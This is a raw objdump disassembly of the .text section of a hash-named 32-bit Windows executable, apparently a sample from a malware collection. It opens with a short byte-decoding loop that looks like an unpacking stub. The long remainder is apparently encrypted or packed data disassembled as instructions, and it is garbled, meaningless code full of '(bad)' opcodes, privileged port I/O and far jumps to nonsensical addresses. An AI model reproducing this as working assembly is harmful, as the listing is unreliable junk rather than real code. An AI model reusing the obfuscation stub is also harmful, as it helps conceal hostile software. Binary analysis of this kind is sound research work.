
3885bcb9934b96ea2b2ddfe30d750405d2782e4bedc197c358a719e1a26f0512.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	add    eax,edx
  41107c:	and    eax,0x5a5fd893
  411081:	push   ebx
  411082:	inc    ebx
  411083:	shl    edx,1
  411085:	sahf   
  411086:	jne    0x411023
  411088:	mov    al,ds:0x593707ce
  41108d:	jl     0x411100
  41108f:	sbb    al,0x95
  411092:	mov    dl,0xb6
  411094:	test   eax,0x660314ee
  411099:	push   cs
  41109a:	xchg   esp,eax
  41109b:	adc    BYTE PTR ds:0x6085815c,0xe5
  4110a2:	imul   ebx,DWORD PTR [eax-0x77],0xffffffb4
  4110a6:	fsub   QWORD PTR [edx]
  4110a8:	mov    BYTE PTR [eax+0x4d],dh
  4110ab:	push   cs
  4110ac:	add    dh,al
  4110ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110af:	pop    ebp
  4110b0:	mov    WORD PTR [ecx+0x1ce6e29e],?
  4110b6:	fiadd  WORD PTR [ebp-0x1c]
  4110b9:	jns    0x411111
  4110bb:	stos   BYTE PTR es:[edi],al
  4110bc:	scas   al,BYTE PTR es:[edi]
  4110bd:	mov    ss:0x8766f236,eax
  4110c3:	in     eax,0x19
  4110c5:	sbb    BYTE PTR [eax+0x42],cl
  4110c8:	xchg   edi,eax
  4110c9:	rcr    BYTE PTR [ecx+0xe],1
  4110cc:	imul   dl
  4110ce:	dec    edi
  4110cf:	xchg   esp,eax
  4110d0:	mov    ds:0x1445ac4a,al
  4110d5:	and    al,0x27
  4110d7:	je     0x4110cc
  4110d9:	jb     0x411094
  4110db:	aad    0x7c
  4110dd:	pop    ecx
  4110de:	xlat   BYTE PTR ds:[ebx]
  4110df:	push   0xffffff8a
  4110e1:	mov    DWORD PTR [edx+0x1f],esp
  4110e4:	shl    DWORD PTR [ecx-0x7f],0x21
  4110e8:	sub    dl,dh
  4110ea:	and    DWORD PTR [ebx-0x3e6db185],esi
  4110f0:	inc    esi
  4110f1:	jbe    0x4110bd
  4110f3:	add    DWORD PTR [ebp-0x2c],edi
  4110f6:	or     BYTE PTR [edx],cl
  4110f8:	jne    0x411083
  4110fa:	inc    ebx
  4110fb:	(bad)  
  4110fc:	lods   al,BYTE PTR ds:[esi]
  4110fd:	mov    ds:0xc0a3bac6,al
  411103:	jo     0x411090
  411105:	and    ah,al
  411107:	jno    0x4110f6
  411109:	xchg   esi,eax
  41110a:	iret   
  41110b:	data16 loop 0x411152
  41110e:	mov    ebx,0xcd2bb49e
  411113:	jbe    0x4110c3
  411115:	fimul  DWORD PTR [eax+0x37]
  411118:	jno    0x4110f2
  41111a:	mov    DWORD PTR [eax-0xd],eax
  41111d:	xor    eax,0xe2e55b00
  411122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411123:	xor    DWORD PTR ds:0xd648927e,ecx
  411129:	dec    edx
  41112a:	jns    0x41114c
  41112c:	hlt    
  41112d:	bnd jmp 0x4110b3
  411130:	xlat   BYTE PTR ds:[ebx]
  411131:	mov    eax,ds:0xe56d2c5
  411136:	xchg   ebx,eax
  411137:	push   es
  411138:	jnp    0x41118d
  41113a:	ror    BYTE PTR [eax-0x80],1
  41113d:	sub    BYTE PTR [ebx-0x8],dl
  411140:	or     eax,0x3004cee8
  411145:	arpl   dx,sp
  411147:	push   es
  411148:	bound  edi,QWORD PTR [ebp+0xa]
  41114b:	dec    esi
  41114c:	stc    
  41114d:	add    BYTE PTR [edi-0x7f],cl
  411150:	dec    ebx
  411151:	jb     0x411189
  411153:	(bad)  
  411156:	xor    DWORD PTR [edi+0x4a],esp
  411159:	mov    ebp,0x1337956
  41115e:	push   es
  41115f:	mov    ecx,0xb12908ab
  411164:	sti    
  411165:	jecxz  0x411179
  411167:	jb     0x4111a6
  411169:	hlt    
  41116a:	mov    DWORD PTR [esi],edx
  41116c:	or     eax,ebp
  41116e:	mov    bh,0x59
  411170:	lods   eax,DWORD PTR ds:[esi]
  411171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411172:	pop    edi
  411173:	xchg   ebx,eax
  411174:	out    0xa9,eax
  411176:	call   0xd83e:0x18a8a656
  41117d:	data16 sub al,0xbe
  411180:	adc    al,0xd1
  411182:	ret    0xa3c5
  411185:	scas   al,BYTE PTR es:[edi]
  411186:	dec    edi
  411187:	outs   dx,BYTE PTR ds:[esi]
  411188:	js     0x41110a
  41118a:	mov    bl,0xd1
  41118c:	jb     0x4111b1
  41118e:	adc    DWORD PTR [edx+0x3a397b2d],eax
  411194:	inc    edi
  411195:	mov    ds:0xd7a3c28b,eax
  41119a:	lock push 0xffffffe6
  41119d:	out    0x46,al
  41119f:	pop    ecx
  4111a0:	inc    esi
  4111a1:	in     al,0x6a
  4111a3:	dec    ecx
  4111a4:	ficomp DWORD PTR [edi-0x1f1fcac8]
  4111aa:	mov    edi,0x68ef3c7d
  4111af:	mov    ebp,0x573cf61c
  4111b4:	sub    BYTE PTR [eax-0xe],al
  4111b7:	add    al,0x2a
  4111b9:	repz jns 0x411183
  4111bc:	(bad)  
  4111bd:	jo     0x411162
  4111bf:	jp     0x411205
  4111c1:	xor    BYTE PTR ss:[ecx-0x38],dh
  4111c5:	(bad)  
  4111c6:	pop    esp
  4111c7:	ins    BYTE PTR es:[edi],dx
  4111c8:	push   ss
  4111c9:	xlat   BYTE PTR ds:[ebx]
  4111ca:	xchg   edi,eax
  4111cb:	mov    ebp,0xf10958d6
  4111d0:	lds    edi,FWORD PTR [ecx]
  4111d2:	repz xor bl,BYTE PTR [edx+edx*2-0x5ed0aba8]
  4111da:	mov    DWORD PTR [ecx-0x4d],ecx
  4111dd:	arpl   WORD PTR [edx],bp
  4111df:	pop    edi
  4111e0:	shl    BYTE PTR [ebx-0x2979fce0],cl
  4111e6:	jb     0x411236
  4111e8:	add    bl,al
  4111ea:	or     eax,DWORD PTR [esi+0x3d]
  4111ed:	adc    al,BYTE PTR [esi+0x6c]
  4111f0:	jge    0x411203
  4111f2:	(bad)  
  4111f3:	iret   
  4111f4:	aam    0x99
  4111f6:	xchg   ecx,eax
  4111f7:	jnp    0x41122a
  4111f9:	xor    eax,0x55c100fc
  4111fe:	sub    ebx,ebx
  411200:	hlt    
  411201:	push   edx
  411202:	pop    ebp
  411203:	stos   BYTE PTR es:[edi],al
  411204:	hlt    
  411205:	bound  ebp,QWORD PTR [ebx]
  411207:	mov    dl,0x6f
  411209:	pop    ss
  41120a:	xchg   ebp,eax
  41120b:	shl    DWORD PTR [edx+0x5e7b612c],0xd3
  411212:	lods   eax,DWORD PTR ds:[esi]
  411213:	jg     0x41122a
  411215:	push   es
  411216:	rcr    BYTE PTR [esi+0x13],cl
  411219:	test   DWORD PTR [edx-0x6e74cc8f],0x92c2761c
  411223:	mov    edi,0x4d887f37
  411228:	jbe    0x41127e
  41122a:	and    esi,DWORD PTR ds:0x4ff7a119
  411230:	xor    esp,DWORD PTR ss:[ecx]
  411233:	lods   al,BYTE PTR ds:[esi]
  411234:	sbb    DWORD PTR ds:0x4b1ea089,edi
  41123a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41123b:	xor    al,0xef
  41123d:	or     dl,BYTE PTR [esp+edi*4]
  411240:	js     0x411236
  411242:	into   
  411243:	or     DWORD PTR [ebp+0x4e],esi
  411246:	aaa    
  411247:	je     0x411225
  411249:	adc    ebx,0xd
  41124c:	adc    al,0x5c
  41124e:	push   eax
  41124f:	sahf   
  411250:	mov    bl,0x10
  411252:	ficomp DWORD PTR [edi-0x352b35fa]
  411258:	dec    BYTE PTR [eax-0xf]
  41125b:	arpl   WORD PTR [eax+ecx*4+0x64],di
  41125f:	push   cs
  411260:	into   
  411261:	loop   0x411289
  411263:	inc    BYTE PTR [ebp+edx*1-0x1b]
  411267:	adc    dh,BYTE PTR [esp+ebp*1-0x68]
  41126b:	mov    ebp,0xde22f745
  411270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411271:	(bad)  
  411272:	jno    0x41120b
  411274:	pop    eax
  411275:	xchg   ecx,eax
  411276:	ror    ebx,cl
  411278:	psrad  mm6,QWORD PTR [esi]
  41127b:	sub    al,0xab
  41127d:	repnz out dx,al
  41127f:	xchg   DWORD PTR [esi+0x1eedc13],ebx
  411285:	aaa    
  411286:	mov    ecx,0xef5b6332
  41128b:	(bad)  
  41128c:	mov    ah,0x95
  41128e:	test   BYTE PTR [ecx],dl
  411290:	add    BYTE PTR [edx],dh
  411292:	and    al,0x93
  411294:	arpl   bp,dx
  411296:	mov    dh,0x6b
  411298:	cmp    edi,DWORD PTR [eax+0x21b332d9]
  41129e:	xor    esp,ebx
  4112a0:	(bad)  
  4112a1:	pushf  
  4112a2:	imul   edi,ebp,0xffffffd3
  4112a5:	push   ebx
  4112a6:	sbb    DWORD PTR [esi+0x4668bd99],edi
  4112ac:	mov    ebp,0x65bbca77
  4112b1:	dec    ebx
  4112b2:	sbb    eax,0x904f915a
  4112b7:	xchg   BYTE PTR [edx-0x24feabc9],dh
  4112bd:	es scas al,BYTE PTR es:[edi]
  4112bf:	test   DWORD PTR [esi+0x7e],edx
  4112c2:	dec    eax
  4112c3:	ficom  DWORD PTR [eax+0x2654c399]
  4112c9:	inc    esp
  4112ca:	mov    DWORD PTR [esi],ebp
  4112cc:	in     eax,dx
  4112cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ce:	lds    ebp,FWORD PTR gs:[edx-0x4f]
  4112d2:	sub    edx,DWORD PTR [esi-0x5a46f6eb]
  4112d8:	hlt    
  4112d9:	push   0x1084e4c3
  4112de:	dec    ebp
  4112df:	push   ebp
  4112e0:	xor    eax,0x63fb7c9c
  4112e5:	mov    edi,0x6a2c1e71
  4112ea:	enter  0x87d5,0x8a
  4112ee:	push   eax
  4112ef:	dec    ebx
  4112f0:	jg     0x4112cb
  4112f2:	hlt    
  4112f3:	mov    ebx,0x12cac733
  4112f8:	aaa    
  4112f9:	cmp    ebp,DWORD PTR [ebp-0x6ab82e87]
  4112ff:	jl     0x41133f
  411301:	icebp  
  411302:	jp     0x41132c
  411304:	jle    0x411364
  411306:	outs   dx,BYTE PTR ds:[esi]
  411307:	xlat   BYTE PTR ds:[ebx]
  411308:	sti    
  411309:	mov    cl,0xcb
  41130b:	xchg   ebp,eax
  41130c:	popa   
  41130d:	out    0x45,al
  41130f:	sbb    dl,dl
  411311:	retf   0xb082
  411314:	cli    
  411315:	add    ah,BYTE PTR [ebx]
  411317:	fimul  WORD PTR [edi]
  411319:	or     al,0x49
  41131b:	mov    ebp,0xe42d2dea
  411320:	mov    cl,0x95
  411322:	dec    esi
  411323:	pop    ecx
  411324:	fwait
  411325:	pushf  
  411326:	dec    esi
  411327:	dec    eax
  411328:	jge    0x4112fa
  41132a:	pop    eax
  41132b:	dec    edx
  41132c:	pop    ebx
  41132d:	and    DWORD PTR [ebp-0x44],edi
  411330:	add    al,0xec
  411332:	inc    edi
  411333:	jns    0x411382
  411335:	xor    dl,ch
  411337:	add    ah,BYTE PTR [esi]
  411339:	inc    edi
  41133a:	pop    ebx
  41133b:	add    al,0x96
  41133d:	and    BYTE PTR [edx],ah
  41133f:	xchg   esi,eax
  411340:	push   edx
  411341:	inc    ecx
  411342:	adc    cl,BYTE PTR [ebp-0x52]
  411345:	mov    ecx,0xc49d3ee8
  41134a:	repz loopne 0x41131a
  41134d:	lea    edx,[ebp-0x3ad50e07]
  411353:	clc    
  411354:	push   ebp
  411355:	adc    eax,0x198fe40f
  41135a:	jns    0x4112e9
  41135c:	fcmovne st,st(3)
  41135e:	fs sbb al,0x27
  411361:	das    
  411362:	jns    0x41134e
  411364:	retf   0x443e
  411367:	outs   dx,DWORD PTR ds:[esi]
  411368:	or     BYTE PTR [edx],dh
  41136a:	jnp    0x411386
  41136c:	(bad)  
  41136d:	mov    cl,BYTE PTR [esi+0x3a]
  411370:	and    edx,DWORD PTR [eax-0x2c]
  411373:	pop    edx
  411374:	sbb    bl,dh
  411376:	arpl   WORD PTR [eax+0x1e65e5ef],sp
  41137c:	mov    ah,0x9c
  41137e:	mov    ebx,0x646bd0c3
  411383:	xor    DWORD PTR [esi+0x64],0x62
  411387:	lods   eax,DWORD PTR ds:[esi]
  411388:	pop    ss
  411389:	dec    edi
  41138a:	int    0xc1
  41138c:	cmp    ecx,DWORD PTR [ebx+0x41]
  41138f:	outs   dx,BYTE PTR ds:[esi]
  411390:	arpl   WORD PTR [ebp-0x1f],di
  411393:	stc    
  411394:	jmp    0x411363
  411396:	shl    BYTE PTR ds:0x398b2600,0xcb
  41139d:	out    0xec,eax
  41139f:	push   ds
  4113a0:	es call 0x8c41:0x573163e4
  4113a8:	inc    esi
  4113a9:	mov    ebx,0xd2441ece
  4113ae:	(bad)  
  4113af:	scas   eax,DWORD PTR es:[edi]
  4113b0:	sub    al,0x33
  4113b2:	mov    eax,ds:0x5ae73e98
  4113b7:	clc    
  4113b8:	add    cl,0xda
  4113bb:	pop    es
  4113bc:	(bad)  
  4113bd:	adc    al,0xc2
  4113bf:	inc    esi
  4113c0:	pop    es
  4113c1:	cmp    al,0xb9
  4113c3:	pop    eax
  4113c4:	out    dx,al
  4113c5:	ins    DWORD PTR es:[edi],dx
  4113c6:	cmp    ecx,DWORD PTR [esi+0x6f]
  4113c9:	lods   eax,DWORD PTR ds:[esi]
  4113ca:	repnz cmp al,0x48
  4113cd:	xchg   esi,eax
  4113ce:	mov    ebx,?
  4113d0:	xchg   edi,eax
  4113d1:	bound  eax,QWORD PTR [eax+0x76aff9ed]
  4113d7:	scas   eax,DWORD PTR es:[edi]
  4113d8:	jae    0x411418
  4113da:	(bad)  
  4113db:	pushf  
  4113dc:	mov    ecx,0xbb3ee4b5
  4113e1:	jne    0x411415
  4113e3:	inc    esi
  4113e4:	clc    
  4113e5:	(bad)  
  4113e6:	jg     0x4113dd
  4113e8:	retf   
  4113e9:	mov    eax,ds:0xd08365b0
  4113ee:	dec    edi
  4113ef:	or     BYTE PTR [ebx+0x8e8bc5a],bh
  4113f5:	xlat   BYTE PTR ds:[ebx]
  4113f6:	add    eax,0x9b67af41
  4113fb:	push   0xffffffc3
  4113fd:	stos   BYTE PTR es:[edi],al
  4113fe:	sbb    esi,DWORD PTR [ebx]
  411400:	and    esi,DWORD PTR ds:0x329421b3
  411406:	push   ebp
  411407:	push   esp
  411408:	mov    esi,0x20e10e92
  41140d:	mov    bl,0x2b
  41140f:	fstp   TBYTE PTR [ebx-0xe]
  411412:	xchg   edx,eax
  411413:	mov    ecx,0x8ab1dfc
  411418:	add    eax,0x4d12731a
  41141d:	mov    eax,ds:0x56f9975
  411422:	jo     0x411468
  411424:	mov    ch,0x5e
  411426:	inc    eax
  411427:	push   esi
  411428:	jbe    0x41148f
  41142a:	dec    esi
  41142b:	test   BYTE PTR [esi-0x5f3c74c9],bh
  411431:	in     al,0xd8
  411433:	loopne 0x4113ff
  411435:	dec    ebp
  411436:	xchg   edx,eax
  411437:	test   eax,ecx
  411439:	xchg   edi,eax
  41143a:	add    esp,DWORD PTR [esi-0x42]
  41143d:	sub    al,0x26
  41143f:	xor    eax,0x7a206f6b
  411444:	call   0xb7f31ab1
  411449:	xchg   esp,eax
  41144a:	adc    cl,dh
  41144c:	jns    0x4113f5
  41144e:	add    al,0x9e
  411450:	mov    eax,0xe5b4721b
  411455:	(bad)  
  411456:	sub    cl,ah
  411458:	ficom  WORD PTR [ebx+ebx*8-0x6]
  41145c:	xchg   BYTE PTR [eax+0x39],ah
  41145f:	sbb    ecx,DWORD PTR [ebp+0x6]
  411462:	fisub  WORD PTR [esi]
  411464:	inc    bx
  411466:	ss add eax,0x355f450c
  41146c:	mov    DWORD PTR [edx-0x43f60aee],ebx
  411472:	ds push esp
  411474:	in     al,dx
  411475:	adc    al,0x9b
  411477:	dec    esp
  411478:	mov    ebp,0x196e43d2
  41147d:	leave  
  41147e:	fst    QWORD PTR [eax+0x61d63412]
  411484:	xlat   BYTE PTR ds:[ebx]
  411485:	push   cs
  411486:	stos   BYTE PTR es:[edi],al
  411487:	jmp    0x69e0:0xd141fca6
  41148e:	jecxz  0x411418
  411490:	mov    ecx,0x5be3080
  411495:	out    0xf4,eax
  411497:	test   DWORD PTR [ecx],esp
  411499:	icebp  
  41149a:	(bad)  
  41149b:	fldcw  WORD PTR [edx+0x4387c2d5]
  4114a1:	add    ebx,esi
  4114a3:	inc    esp
  4114a4:	lahf   
  4114a5:	rcr    ch,1
  4114a7:	jne    0x411475
  4114a9:	ss scas al,BYTE PTR es:[edi]
  4114ab:	aas    
  4114ac:	dec    edx
  4114ad:	sbb    al,0x5e
  4114af:	loope  0x41146b
  4114b1:	or     eax,0x8e17907e
  4114b6:	sub    eax,DWORD PTR [esi]
  4114b8:	dec    ecx
  4114b9:	mov    ch,0xbe
  4114bb:	xor    al,bl
  4114bd:	outs   dx,BYTE PTR ds:[esi]
  4114be:	jnp    0x411442
  4114c0:	pop    ebx
  4114c1:	jmp    0xedb065e5
  4114c6:	push   ebp
  4114c7:	push   esi
  4114c8:	out    dx,al
  4114c9:	inc    eax
  4114ca:	(bad)  
  4114cb:	jne    0x4114dd
  4114cd:	jl     0x411513
  4114cf:	push   ds
  4114d0:	fimul  WORD PTR [eax-0x43]
  4114d3:	aas    
  4114d4:	lea    eax,[eax-0x11871bb1]
  4114da:	push   0x9
  4114dc:	inc    ecx
  4114dd:	fcmovb st,st(7)
  4114df:	sbb    al,0x62
  4114e1:	lahf   
  4114e2:	or     ebx,0xe0e7c261
  4114e8:	cmp    ebx,DWORD PTR [edx]
  4114ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114eb:	mov    ecx,0x69b705f0
  4114f0:	jle    0x41150c
  4114f2:	xchg   esi,eax
  4114f3:	mov    ds:0x46936f0,eax
  4114f8:	dec    ebp
  4114f9:	mov    ebx,0x7044615a
  4114fe:	div    ebp
  411500:	test   eax,0x9bc0c066
  411505:	mov    ebx,fs
  411507:	aaa    
  411508:	sub    BYTE PTR [ecx-0x75],bh
  41150b:	sbb    bh,BYTE PTR [esi+0x58ad50cf]
  411511:	or     BYTE PTR [edi],ah
  411513:	(bad)  
  411514:	inc    esp
  411515:	push   ss
  411516:	pop    ebp
  411517:	out    dx,al
  411518:	push   ds
  411519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41151a:	lahf   
  41151b:	xor    dl,BYTE PTR [ecx-0x331a1d07]
  411521:	sub    edi,DWORD PTR [edx]
  411523:	loopne 0x4114f8
  411525:	iret   
  411526:	sub    esi,DWORD PTR [edi+esi*2-0x55005d5]
  41152d:	sbb    DWORD PTR [ebx+0x69ebb96],esp
  411533:	dec    ebp
  411534:	push   ds
  411535:	enter  0x3a18,0x84
  411539:	(bad)  
  41153a:	leave  
  41153b:	jbe    0x411534
  41153d:	(bad)  
  41153e:	fst    DWORD PTR [edi+0x28]
  411541:	sbb    BYTE PTR [esi-0x33],bl
  411544:	sub    edx,0xc2562442
  41154a:	mov    bh,0x53
  41154c:	mov    al,0x36
  41154e:	cld    
  41154f:	pop    es
  411550:	mov    esp,0x33d91d7e
  411555:	cwde   
  411556:	outs   dx,DWORD PTR ds:[esi]
  411557:	xchg   esp,eax
  411558:	aaa    
  411559:	add    BYTE PTR [eax+0x2f],dh
  41155c:	cmp    ecx,DWORD PTR [edx+ecx*8-0x12]
  411560:	fcmovu st,st(2)
  411562:	jmp    esi
  411564:	(bad)  
  411565:	lea    esp,[esi-0xc]
  411568:	rol    esp,cl
  41156a:	xchg   edx,eax
  41156b:	ins    DWORD PTR es:[edi],dx
  41156c:	mul    al
  41156e:	jb     0x4115c0
  411570:	gs pop ebp
  411572:	shl    BYTE PTR [edi],0x31
  411575:	(bad)  
  411576:	shl    DWORD PTR [esi+0x60],1
  411579:	sar    BYTE PTR [esi-0x67],cl
  41157c:	fdiv   DWORD PTR [ecx+0x687d7327]
  411582:	je     0x4115e2
  411584:	out    0x69,al
  411586:	mov    edi,0x7ab12e5d
  41158b:	xlat   BYTE PTR ds:[ebx]
  41158c:	sahf   
  41158d:	xchg   DWORD PTR [edx-0x48],ebx
  411590:	popf   
  411591:	fwait
  411592:	outs   dx,DWORD PTR ds:[esi]
  411593:	in     al,dx
  411594:	ret    0xae61
  411597:	or     DWORD PTR [ecx],edi
  411599:	ffree  st(4)
  41159b:	jne    0x4115b8
  41159d:	fcomp  DWORD PTR [edi+edi*1-0x615adeb6]
  4115a4:	(bad)  
  4115a5:	jmp    0xbe2e4248
  4115aa:	test   DWORD PTR [ecx],edx
  4115ac:	fld    TBYTE PTR [esi+0x4d]
  4115af:	lods   al,BYTE PTR ds:[esi]
  4115b0:	(bad)  
  4115b1:	nop
  4115b2:	sbb    eax,0xddbbe155
  4115b7:	int    0x18
  4115b9:	js     0x411597
  4115bb:	jmp    0xd7fd:0xee3dab10
  4115c2:	pusha  
  4115c3:	pushf  
  4115c4:	cmp    dl,al
  4115c6:	mov    bl,0x2c
  4115c8:	inc    ebp
  4115c9:	test   ebx,esi
  4115cb:	(bad)  
  4115cd:	jbe    0x411578
  4115cf:	xchg   edi,eax
  4115d0:	(bad)  
  4115d1:	stc    
  4115d2:	mov    ds:0x4030cace,al
  4115d7:	into   
  4115d8:	int    0x5d
  4115da:	fild   QWORD PTR [ecx+0x7641a556]
  4115e0:	stos   DWORD PTR es:[edi],eax
  4115e1:	adc    eax,0x630221c1
  4115e6:	sar    ebx,1
  4115e8:	je     0x41163b
  4115ea:	mov    bl,0x83
  4115ec:	mov    eax,ds:0x2c0c3077
  4115f1:	xor    edi,DWORD PTR [ecx+0x23]
  4115f4:	jmp    0x517e0018
  4115f9:	adc    ch,ch
  4115fb:	ins    DWORD PTR es:[edi],dx
  4115fc:	sbb    BYTE PTR [esi+0x51],bl
  4115ff:	fadd   QWORD PTR [eax]
  411601:	fbld   TBYTE PTR [ebx]
  411603:	mov    es,WORD PTR ds:0xe21d6d46
  411609:	mov    ebp,0x119fb3ad
  41160e:	inc    edx
  41160f:	jmp    0x6cc5:0x78901bb1
  411616:	das    
  411617:	nop
  411618:	rcr    ebp,1
  41161a:	stos   BYTE PTR es:[edi],al
  41161b:	mov    BYTE PTR [ebp+0x66589681],bl
  411621:	fs pop ebx
  411623:	hlt    
  411624:	outs   dx,DWORD PTR ds:[esi]
  411625:	push   0x58
  411627:	jmp    0x9ea3e17f
  41162c:	xor    al,0xda
  41162e:	push   cs
  41162f:	mov    dh,0xcd
  411631:	push   esi
  411632:	inc    ecx
  411633:	lds    ecx,FWORD PTR [ecx+0x27cce6f8]
  411639:	stc    
  41163a:	lds    ebx,FWORD PTR [edi-0x3e7488f6]
  411640:	xchg   BYTE PTR ds:0x63702d0c,bl
  411646:	out    0xe6,al
  411648:	pop    ebx
  411649:	jne    0x411638
  41164b:	retf   
  41164c:	jbe    0x411695
  41164e:	out    dx,eax
  41164f:	push   edi
  411650:	fs add ecx,ecx
  411653:	js     0x411604
  411655:	pushf  
  411656:	or     eax,0xe46f80dd
  41165b:	rcl    BYTE PTR [ebp-0x41e6dbdd],0x7c
  411662:	add    ch,BYTE PTR [ecx+0x20]
  411665:	shr    BYTE PTR [ebx+ebx*1-0x56],cl
  411669:	ja     0x41167b
  41166b:	pop    esp
  41166c:	add    dl,BYTE PTR [edi+edi*4-0x221a624c]
  411673:	cmc    
  411674:	jecxz  0x41165d
  411676:	mov    ecx,0xf071ab4b
  41167b:	adc    ecx,ebx
  41167d:	pushf  
  41167e:	xchg   edi,eax
  41167f:	mov    eax,0xd6e1fe75
  411684:	pop    eax
  411685:	adc    DWORD PTR [ebx],ebx
  411687:	mov    ecx,0x6404d558
  41168c:	nop
  41168d:	call   0xe47bfcf3
  411692:	cmc    
  411693:	cmp    edx,DWORD PTR [edi-0xd]
  411696:	lock or bl,cl
  411699:	inc    ebx
  41169a:	sahf   
  41169b:	push   0xffffff8f
  41169d:	mov    ecx,ss
  41169f:	aad    0xdb
  4116a1:	mov    ebp,DWORD PTR [edi-0x5d85be4c]
  4116a7:	ret    
  4116a8:	scas   al,BYTE PTR es:[edi]
  4116a9:	or     al,0x4f
  4116ab:	sahf   
  4116ac:	mov    bh,0xbb
  4116ae:	in     eax,dx
  4116af:	mov    esi,0xc8017404
  4116b4:	adc    esp,ebx
  4116b6:	popf   
  4116b7:	call   0xda58:0xaf9f3788
  4116be:	ins    DWORD PTR es:[edi],dx
  4116bf:	mov    eax,0xfa9b6233
  4116c4:	push   0x889ef27
  4116c9:	call   0x4465:0xcaffb284
  4116d0:	icebp  
  4116d1:	xchg   esp,eax
  4116d2:	pop    eax
  4116d3:	sti    
  4116d4:	ret    0x49fd
  4116d7:	ja     0x4116c3
  4116d9:	inc    edi
  4116da:	clc    
  4116db:	shl    BYTE PTR ds:0xc5338e52,1
  4116e1:	mov    ebp,0xca7b5782
  4116e6:	sub    ch,dh
  4116e8:	in     eax,dx
  4116e9:	(bad)  
  4116ea:	xor    BYTE PTR [eax-0x13],ah
  4116ed:	lods   al,BYTE PTR ds:[esi]
  4116ee:	out    0x49,eax
  4116f0:	dec    eax
  4116f1:	mov    dh,0x3d
  4116f3:	retf   0xaa2
  4116f6:	xchg   esp,eax
  4116f7:	loope  0x411704
  4116f9:	push   esi
  4116fa:	scas   eax,DWORD PTR es:[edi]
  4116fb:	mov    esi,0x49409b5e
  411700:	push   ecx
  411701:	popa   
  411702:	pop    edi
  411703:	mov    esp,0xbd93d75a
  411708:	jg     0x411693
  41170a:	es es pop edx
  41170d:	sub    edi,0x1a
  411710:	cmp    BYTE PTR [ecx+0x36],ch
  411713:	mov    ecx,0xdd878e99
  411718:	in     al,dx
  411719:	mov    ah,0x8c
  41171b:	(bad)  
  41171c:	ret    
  41171d:	(bad)
  411720:	add    eax,0x8f136053
  411725:	sahf   
  411726:	pop    ebp
  411727:	mov    dh,0xed
  411729:	leave  
  41172a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41172b:	mov    ds:0xa41a3e2f,al
  411730:	xor    bh,BYTE PTR ds:0xd80ac356
  411736:	(bad)  ds:[edx]
  411739:	inc    eax
  41173a:	nop
  41173b:	xchg   ebp,eax
  41173c:	(bad)  
  41173e:	mov    ds:0x1a33fcac,al
  411743:	or     esp,DWORD PTR [edi]
  411745:	and    esi,DWORD PTR [edx-0x44]
  411748:	xchg   DWORD PTR [edx-0x57],esp
  41174b:	dec    edx
  41174c:	lds    edx,FWORD PTR [ebp-0x4c6757b1]
  411752:	mov    dh,0xbf
  411754:	push   esp
  411755:	loope  0x41179d
  411757:	les    edi,FWORD PTR [ebx+0x51b03c20]
  41175d:	not    DWORD PTR [ecx+ebx*2+0x6]
  411761:	or     ebp,edx
  411763:	adc    al,0xbc
  411765:	mov    WORD PTR [edi],fs
  411767:	dec    esi
  411768:	(bad)  [ebp-0x68]
  41176b:	dec    edx
  41176c:	sbb    al,0x86
  41176e:	xchg   BYTE PTR [edx],bh
  411770:	jl     0x41174c
  411772:	gs aad 0xe5
  411775:	and    dh,BYTE PTR [ebx]
  411777:	lods   al,BYTE PTR ds:[esi]
  411778:	xor    BYTE PTR [ebx-0x40],dl
  41177b:	sbb    DWORD PTR [ebp-0x61a5513e],edi
  411781:	adc    bh,BYTE PTR [ebp-0x7ccbf7d4]
  411787:	les    edi,FWORD PTR [eax+ebp*2-0x2a88ac04]
  41178e:	push   cs
  41178f:	pop    es
  411790:	ss inc ecx
  411792:	loop   0x41177f
  411794:	repz jl 0x41178e
  411797:	mov    edi,0xb4ef90e1
  41179c:	push   0xe108de0e
  4117a1:	add    bh,0xe2
  4117a4:	jmp    0x4f52:0xa2ee0a0f
  4117ab:	repz adc al,0x7e
  4117ae:	jae    0x41173c
  4117b0:	cmc    
  4117b1:	test   bl,dh
  4117b3:	push   0x7d7fb954
  4117b8:	add    eax,0xefaf3154
  4117bd:	sub    eax,0x3b
  4117c0:	push   0xfffffffc
  4117c2:	add    bl,BYTE PTR [eax+0x793eb1b3]
  4117c8:	and    eax,0x4b5806d4
  4117cd:	cld    
